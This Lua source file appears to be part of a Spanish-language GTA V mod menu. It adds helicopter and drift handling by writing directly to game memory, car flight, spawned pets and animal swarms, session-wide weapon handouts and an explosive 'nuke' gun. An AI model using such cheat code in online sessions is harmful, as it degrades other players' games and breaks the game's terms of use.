get_vtable_entry_pointer = function(address, index)
    return memory.read_long(memory.read_long(address) + (8 * index))
end
get_sub_handling_types = function(vehicle, type)
    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
    local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
    local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
    local types = {registerd = sub_handling_count, found = 0}
    for i = 0, sub_handling_count - 1, 1 do
        local sub_handling_data = memory.read_long(sub_handling_array + 8 * i)
        if sub_handling_data ~= 0 then
            local GetSubHandlingType_address = get_vtable_entry_pointer(sub_handling_data, 2)
            local result = util.call_foreign_function(GetSubHandlingType_address, sub_handling_data)
            if type and type == result then return sub_handling_data end
            types[#types+1] = {type = result, address = sub_handling_data}
            types.found = types.found + 1
        end
    end
    if type then return nil else return types end
end
local thrust_offset = 0x8
local better_heli_handling_offsets = {
    ["fYawMult"] = 0x18, -- dont remember
    ["fYawStabilise"] = 0x20, --minor stabalization
    ["fSideSlipMult"] = 0x24, --minor stabalizaztion
    ["fRollStabilise"] = 0x30, --minor stabalization
    ["fAttackLiftMult"] = 0x48, --disables most of it
    ["fAttackDiveMult"] = 0x4C, --disables most of the other axis
    ["fWindMult"] = 0x58, --helps with removing some jitter
    ["fPitchStabilise"] = 0x3C --idk what it does but it seems to help
}

realheli = menu.list(vehicles, "Helicopteros", {}, "Opciones de control real en helicoptero")

menu.slider_float(realheli, "Potencia Helicoptero Real", {"heliThrust"}, "Potencia de los helis", 0, 1000, 50, 1, function (value)
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        memory.write_float(CflyingHandling + thrust_offset, value * 0.01)
    else
        util.toast("Error\nentra en un heli")
    end
end)

menu.action(realheli, "Modo helicoptero real", {"betterheli"}, "Deshabilita la estabilizacion vertical de los vtol para modo de funcionamiento real", function ()
    local CflyingHandling = get_sub_handling_types(entities.get_user_vehicle_as_handle(), 1)
    if CflyingHandling then
        for _, offset in pairs(better_heli_handling_offsets) do
            memory.write_float(CflyingHandling + offset, 0)
        end
        util.toast("Echo\nIntenta no chocar")
    else
        util.toast("Error\nentra en un heli")
    end
end)

-- Real Helicopter Mode End
--------------------------------------------------------------------------------------------------------------------------------------------------------
--Impulse SportMode start


sportmode = menu.list(vehicles, "Sportmode", {}, "El SportMode que todos recordaremos de Impusle :'3")

PEDD = {
	["GET_VEHICLE_PED_IS_IN"]=function(--[[Ped (int)]] ped,--[[BOOL (bool)]] includeLastVehicle)native_invoker.begin_call();native_invoker.push_arg_int(ped);native_invoker.push_arg_bool(includeLastVehicle);native_invoker.end_call("9A9112A0FE9A4713");return native_invoker.get_return_value_int();end,
}
PLAYERR = {
	["PLAYER_PED_ID"]=function()native_invoker.begin_call();native_invoker.end_call("D80958FC74E988A6");return native_invoker.get_return_value_int();end,
}
CAMM = {
	["GET_GAMEPLAY_CAM_ROT"]=function(--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("837765A25378F0BB");return native_invoker.get_return_value_vector3();end,
	["SET_CAM_ROT"]=--[[void]] function(--[[Cam (int)]] cam,--[[float]] rotX,--[[float]] rotY,--[[float]] rotZ,--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(cam);native_invoker.push_arg_float(rotX);native_invoker.push_arg_float(rotY);native_invoker.push_arg_float(rotZ);native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("85973643155D0B07");end,
	["_SET_GAMEPLAY_CAM_RELATIVE_ROTATION"]=--[[void]] function(--[[float]] roll,--[[float]] pitch,--[[float]] yaw)native_invoker.begin_call();native_invoker.push_arg_float(roll);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(yaw);native_invoker.end_call("48608C3464F58AB4");end,

}
ENTITYY = {
	["SET_ENTITY_ROTATION"]=function(--[[Entity (int)]] entity,--[[float]] pitch,--[[float]] roll,--[[float]] yaw,--[[int]] rotationOrder,--[[BOOL (bool)]] p5)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(roll);native_invoker.push_arg_float(yaw);native_invoker.push_arg_int(rotationOrder);native_invoker.push_arg_bool(p5);native_invoker.end_call("8524A8B0171D5E07");end,
	["SET_ENTITY_COLLISION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle,--[[BOOL (bool)]] keepPhysics)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.push_arg_bool(keepPhysics);native_invoker.end_call("1A9205C1B9EE827F");end,
	["APPLY_FORCE_TO_ENTITY"]=function(--[[Entity (int)]] entity,--[[int]] forceFlags,--[[float]] x,--[[float]] y,--[[float]] z,--[[float]] offX,--[[float]] offY,--[[float]] offZ,--[[int]] boneIndex,--[[BOOL (bool)]] isDirectionRel,--[[BOOL (bool)]] ignoreUpVec,--[[BOOL (bool)]] isForceRel,--[[BOOL (bool)]] p12,--[[BOOL (bool)]] p13)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_int(forceFlags);native_invoker.push_arg_float(x);native_invoker.push_arg_float(y);native_invoker.push_arg_float(z);native_invoker.push_arg_float(offX);native_invoker.push_arg_float(offY);native_invoker.push_arg_float(offZ);native_invoker.push_arg_int(boneIndex);native_invoker.push_arg_bool(isDirectionRel);native_invoker.push_arg_bool(ignoreUpVec);native_invoker.push_arg_bool(isForceRel);native_invoker.push_arg_bool(p12);native_invoker.push_arg_bool(p13);native_invoker.end_call("C5F68BE9613E2D18");end,
	["FREEZE_ENTITY_POSITION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.end_call("428CA6DBD1094446");end,
}
VEHICLEE = {
	["SET_VEHICLE_FORWARD_SPEED"]=function(--[[Vehicle (int)]] vehicle,--[[float]] speed)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_float(speed);native_invoker.end_call("AB54A438726D25D5");end,
	["SET_VEHICLE_GRAVITY"]=function(--[[Vehicle (int)]] vehicle,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_bool(toggle);native_invoker.end_call("89F149B6131E57DA");end,
	["SET_VEHICLE_EXTRA_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] pearlescentColor,--[[int]] wheelColor)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(pearlescentColor);native_invoker.push_arg_int(wheelColor);native_invoker.end_call("2036F561ADD12E33");end,

}
PADD = {
	["IS_CONTROL_PRESSED"]=function(--[[int]] padIndex,--[[int]] control)native_invoker.begin_call();native_invoker.push_arg_int(padIndex);native_invoker.push_arg_int(control);native_invoker.end_call("F3A21BCD95725A4A");return native_invoker.get_return_value_bool();end,
}

veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
local is_vehicle_flying = false
local dont_stop = false
local no_collision = false
local speed = 6
local reset_veloicty = false

menu.toggle(sportmode, "Volar Con Coche", {"vehfly"}, "Te recomiendo poner una tecla a este comando.", function(on_click)
    is_vehicle_flying = on_click
    if reset_veloicty then 
        ENTITYY.FREEZE_ENTITY_POSITION(veh, true)
        util.yield()
        ENTITYY.FREEZE_ENTITY_POSITION(veh, false)
    end
end)
menu.slider(sportmode, "Velocidad", {}, "", 1, 100, 6, 1, function(on_change) 
    speed = on_change
end)
menu.toggle(sportmode, "No pares", {}, "", function(on_click)
    dont_stop = on_click
end)
menu.toggle(sportmode, "Resetear velocidad", {}, "Si no paras de moverte despues de apagarlo, dale aqui", function(on_click)
    reset_veloicty = on_click
end)
menu.toggle(sportmode, "Sin Colision", {}, "", function(on_click)
    no_collision = on_click
end)


vehicleroll = 0


function do_vehicle_fly() 
    veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAMM.GET_GAMEPLAY_CAM_ROT(0);
    ENTITYY.SET_ENTITY_ROTATION(veh, cam_pos.x, vehicleroll, cam_pos.z, 2, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, not no_collision, true);
    if PADD.IS_CONTROL_PRESSED(0, 108) then 
        vehicleroll = vehicleroll -1
    end

    if PADD.IS_CONTROL_PRESSED(0, 109) then 
        vehicleroll = vehicleroll +1
       
    end

    local locspeed = speed*10
    local locspeed2 = speed
    if PADD.IS_CONTROL_PRESSED(0, 61) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end

    
    if PADD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed * 2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
   end
    if PADD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PADD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed*2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end


util.create_tick_handler(function() 


    -- Added by LAZ
    if PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(),false) == 0 then
        if is_vehicle_flying then
            menu.trigger_commands("vehfly")
            util.toast("Sportmode apagado, no esta en un vehiculo")
        end
    else
        if is_vehicle_flying then do_vehicle_fly() end


    end

    -- End Added by LAZ

    VEHICLEE.SET_VEHICLE_GRAVITY(veh, not is_vehicle_flying) 
    if not is_vehicle_flying then 
        ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    end

    return true
end)

util.on_stop(function() 
    VEHICLEE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, true, true);
end)

--------------------------------------------------------------------------------------------------------------------------------
-- Drift Mode Start

local function getCurrentVehicle() 
	local player_id = PLAYER.PLAYER_ID()
	local player_ped = PLAYER.GET_PLAYER_PED(player_id)
    local player_vehicle = 0
    if (PED.IS_PED_IN_ANY_VEHICLE(player_ped)) then
        veh = PED.GET_VEHICLE_PED_IS_USING(player_ped)
        if (NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh)) then
            player_vehicle = veh
        end 
    end
    return player_vehicle
end

local function getHeadingOfTravel(veh) 
    local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
    local x = velocity.x
    local y = velocity.y
    local at2 = math.atan(y, x)
    return math.fmod(270.0 + math.deg(at2), 360.0)
end

local function slamDatBitch(veh, height) 
    if (VEHICLE.IS_VEHICLE_ON_ALL_WHEELS(veh) and not ENTITY.IS_ENTITY_IN_AIR(veh)) then
     
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1,    0, 0, height,    0, 0, 0,   true, true)
    end
end

local function getCurGear()
    return memory.read_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(CurrentGearOffset))
end

local function getNextGear()
    return memory.read_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(NextGearOffset))
end

local function setCurGear(gear)
    memory.write_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(CurrentGearOffset), gear)
end

local function setNextGear(gear)
    memory.write_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(NextGearOffset), gear)
end

local function asDegrees(angle)
    return angle * (180.0 / 3.14159265357); 
end

local function wrap360(val) 
    --    this may be the same as:
    --      return math.fmod(val + 360, 360)
    --    but wierd things happen
    while (val < 0.0) do
        val = val + 360.0
    end
    while (val > 360.0) do
        val = val - 360.0
    end
    return val
end

driftmodee = menu.list(vehicles, "DriftMode", {}, "Modo drift basado en nativos :'3")

local gs_driftMinSpeed = 8.0
local gs_driftMaxAngle = 50.0
local ControlVehicleAccelerate = 71
local ControlVehicleBrake = 72
local ControlVehicleDuck = 73
local ControlVehicleSelectNextWeapon = 99
local ControlVehicleMoveUpOnly = 61
local INPUT_FRONTEND_LS = 209
local DriftActivateKeyboard = INPUT_FRONTEND_LS

CurrentGearOffset = memory.scan("A8 02 0F 84 ? ? ? ? 0F B7 86")+11
NextGearOffset = memory.scan("A8 02 0F 84 ? ? ? ? 0F B7 86")+18

local isDrifting      = 0
local wasDrifting     = 0
local isDriftFinished = 1
local prevGripState   = 0
local lastDriftAngle  = 0.0
local oldGripState    = 0
local debug_notification = 0

textDrawCol = {
    r = 255,
    g = 255,
    b = 255,
    a = 255
}



local function driftmod_ontick() 
    local player = players.user()
    local veh = getCurrentVehicle()
   

    local inVehicle   = veh ~= 0
    local isDriving   = true

    local mps = ENTITY.GET_ENTITY_SPEED(veh)
    local mph       = mps * 2.23694
    local kmh       = mps * 3.6

    if inVehicle and isDriving and not isDrifting and not isDriftFinished then
        isDriftFinished = true
    end

    if not inVehicle or not isDriving then
        return
    end

    local driftKeyPressed = PAD.IS_CONTROL_PRESSED(2, ControlVehicleDuck) or PAD.IS_DISABLED_CONTROL_PRESSED(2, ControlVehicleDuck) or PAD.IS_CONTROL_PRESSED(0, DriftActivateKeyboard) or PAD.IS_DISABLED_CONTROL_PRESSED(0, DriftActivateKeyboard)

    if (driftKeyPressed and getCurGear(veh) > 2) then
        setCurGear(2)
        setNextGear(2)
    end
    if driftKeyPressed then
         
        if (PAD.GET_CONTROL_NORMAL(2, ControlVehicleBrake) > 0.1) then
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, ControlVehicleBrake, 0)
            local neg = -0.3

            if (PAD.IS_CONTROL_PRESSED(2, ControlVehicleSelectNextWeapon)) then
                neg = 10
            end

            slamDatBitch(veh, neg * 1 * PAD.GET_CONTROL_NORMAL(2, ControlVehicleBrake))
        end 

        local angleOfTravel  = getHeadingOfTravel(veh)
        local angleOfHeading = ENTITY.GET_ENTITY_HEADING_FROM_EULERS(veh)
        
        local driftAngle = angleOfHeading - angleOfTravel

        if driftAngle and lastDriftAngle then
            local diff = driftAngle - lastDriftAngle

            if diff > 180.0 then
                driftAngle = driftAngle - 360.0
            end
            if diff < 180.0 then
                driftAngle = driftAngle - 360.0
            end
        end

        driftAngle     = wrap360(driftAngle)
        lastDriftAngle = driftAngle

        local zeroBasedDriftAngle = 360 - driftAngle
        if zeroBasedDriftAngle > 180 then
            zeroBasedDriftAngle = 0 - (360 - zeroBasedDriftAngle)
        end

        directx.draw_text(0,0,"Drift Angle: " .. math.floor(zeroBasedDriftAngle) .. "°", ALIGN_TOP_CENTRE,1,textDrawCol)
        local done = false
        if ((isDrifting or kmh > gs_driftMinSpeed) and (math.abs(driftAngle - 360.0) < gs_driftMaxAngle) or (driftAngle < gs_driftMaxAngle)) then
            isDrifting      = 1
            isDriftFinished = 1;  -- Doesn't get set to 0 until isDrifting is 0.

            if driftKeyPressed then
                 
                if driftKeyPressed ~= oldGripState then
                    VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
                    oldGripState = driftKeyPressed
                end
            end
            done = true
        end

        if not done and kmh < gs_driftMinSpeed then
            if driftKeyPressed then
                if driftKeyPressed ~= oldGripState then
                    VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
                    oldGripState = driftKeyPressed
                end
            end
            done = true
        end

        if not done then
            if driftKeyPressed == oldGripState then
                VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
                oldGripState = 0
            end

            if math.abs(zeroBasedDriftAngle) > gs_driftMaxAngle then
                if zeroBasedDriftAngle > 0 then
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, true)
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, false)

                 
                    util.toast("Counter-steering left ")
                    
                    VEHICLE.SET_VEHICLE_STEER_BIAS(veh, math.rad(zeroBasedDriftAngle * 0.69))
              
                else
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, true)
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, false)
              

                    util.toast("Counter-steering right")

                    VEHICLE.SET_VEHICLE_STEER_BIAS(veh, math.rad(zeroBasedDriftAngle * 0.69))
      
                end
            end
		else 
			VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, false)
			VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, false)
        end
    end

    if not driftKeyPressed and prevGripState then
        isDrifting      = 0
        isDriftFinished = 0
        lastDriftAngle = 0

        if driftKeyPressed ~= oldGripState then
            VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
            oldGripState = driftKeyPressed
        end
    end

    prevGripState = driftKeyPressed
    if isDrifting ~= wasDrifting then
        wasDrifting     = isDrifting
        changedDrifting = true
    end
end


menu.toggle_loop(driftmodee,"Driftmode", {},"Presiona SHIFT para driftear",function(on)
	driftmod_ontick()
end)
driftSetings = menu.list(driftmodee, "Settings", {}, "")

menu.slider(driftSetings,"Velocidad minima /100", {}, "/100", 0, 10000, gs_driftMinSpeed*100, 1, function(on)
    gs_driftMinSpeed = on/100
end)

menu.slider(driftSetings,"Angulo maximo /100", {}, "/100", 0, 10000,gs_driftMaxAngle*100, 1, function(on)
    gs_driftMaxAngle = on/100
end)

menu.colour(driftSetings,"Color del texto", {}, "", textDrawCol,true , function(newCol)
    textDrawCol = newCol
end)



--------------------------------------------------------------------------------------------------------------------------------
-- Diversion

menu.toggle(fun, "Piloto Tesla", {}, "", function(toggled)
    local ped = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    ryze.request_model(tesla_ai)
    ryze.request_model(tesla)
    if toggled then     
       if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            menu.trigger_commands("deletevehicle")
        end

        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true) 
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(ped, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")

        if HUD.IS_WAYPOINT_ACTIVE() then
            local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20.0, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20.0, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)


local randomizer = function(x)
    local r = math.random(1,3)
    return x[r]
end

array = {"1","2","3"}

menu.action(fun, "Jalar el gatillo", {}, "Juega la ruleta rusa con tu juego", function()
    if randomizer(array) == "1" then
        util.toast("Sobreviviste :D")
    else
        util.log("Tu juego murio D:")
        menu.trigger_commands("yeet")
    end
end)

menu.action(fun, "Guerra De Nieve", {}, "Les da una bola de nieve a todos los jugadores en la sesion.", function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        util.toast("Ahora todos tienen bolas de nieve!")
        util.yield()
    end
   
end)

local fpets = menu.list(fun, "Mascotas", {}, "Solo usa 1 a la vez")

--menu.slider(fpets, "Sacar tu mascota", {}, "", "")

--menu.list_select(fpets, "Mascota", {}, ryze.pets, 1, function(ped)
--    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
--        local pet = util.joaat(ped)
--        request_model(pet)
--        local pos = players.get_position(players.user())
--        custom_pet = entities.create_ped(28, pet, pos, 0)
--        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
--        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
--    end
--    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
--    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
--end)

menu.toggle_loop(fpets, "Perrito Mascota", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_shepherd")
        ryze.request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)


menu.toggle_loop(fpets, "Husky Mascota", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_Husky")
        ryze.request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "Pollo Mascota", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_hen")
        ryze.request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

--menu.action(fpets, "Limpiar Mascota", {}, "", function()
--    for i, pet in ipairs(custom_pet) do
--        entities.delete_by_handle(custom_pet[i])
--    end
--end)

local atacks = menu.list(fun, "Ataques", {}, "Varios ataques de animales")

local cat_army = {}
local army = menu.list(atacks, "Ataque Gatuno", {}, "Saca gatos... MUCHOS GATOS!!")
menu.click_slider(army, "Spawnear Ataque G", {}, "", 1, 256, 30, 1, function(val)
    local player = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local ped = util.joaat("a_c_cat_01")
    ryze.request_model(ped)
     for i = 1, val do
        cat_army[i] = entities.create_ped(28, ped, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(cat_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(cat_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(cat_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(cat_army[i], player, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
     end 
end)

menu.action(army, "Limpiar G", {}, "", function()
    for i, ped in ipairs(cat_army) do
        entities.delete_by_handle(cat_army[i])
    end
end)

local hen_army = {}
local army = menu.list(atacks, "Ataque Pollil", {}, "Saca gallinas... MUCHAS GALLINAS!!")
menu.click_slider(army, "Spawnear Ataque H", {}, "", 1, 256, 30, 1, function(val)
    local player = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local ped = util.joaat("a_c_hen")
    ryze.request_model(ped)
     for i = 1, val do
        hen_army[i] = entities.create_ped(28, ped, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(hen_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(hen_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(hen_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(hen_army[i], player, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
     end 
end)

menu.action(army, "Limpiar H", {}, "", function()
    for i, ped in ipairs(hen_army) do
        entities.delete_by_handle(hen_army[i])
    end
end)

armanuc = menu.list(fun, "Opciones Nucleares", {}, "")

local nuke_gun_toggle = menu.toggle(armanuc, "Arma Nuclear", {"JSnukeGun"}, "El rpg dispara nukes", function(toggle)
    nuke_running = toggle	
    if nuke_running then
        if animals_running then menu.trigger_command(exp_animal_toggle, "off") end
        util.create_tick_handler(function()
            if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == -1312131151 then --if holding homing launcher
                if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                    if not remove_projectiles then 
                        remove_projectiles = true 
                        ryze.disableProjectileLoop(-1312131151)
                    end
                    util.create_thread(function()
                        local hash = util.joaat("w_arena_airmissile_01a")
                        STREAMING.REQUEST_MODEL(hash)
                        ryze.yieldModelLoad(hash)
                        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)   
                        local dir, pos = direction()
                        local bomb = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos.x, pos.y, pos.z, true, true, false)
                        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                        ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
                        local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                        entities.delete(bomb)
                        executeNuke(nukePos)
                    end)
                else
                    remove_projectiles = false
                end
            else
                remove_projectiles = false
            end
            return nuke_running
        end)
    end
end)

local nuke_height = 40
menu.slider(armanuc, "Altura De La Nuke", {"JSnukeHeight"}, "Tira Una Nuke En Tu Waypoint.", 10, 100, nuke_height, 10, function(value)
    nuke_height = value
end)

function executeNuke(pos)	
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)	
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end

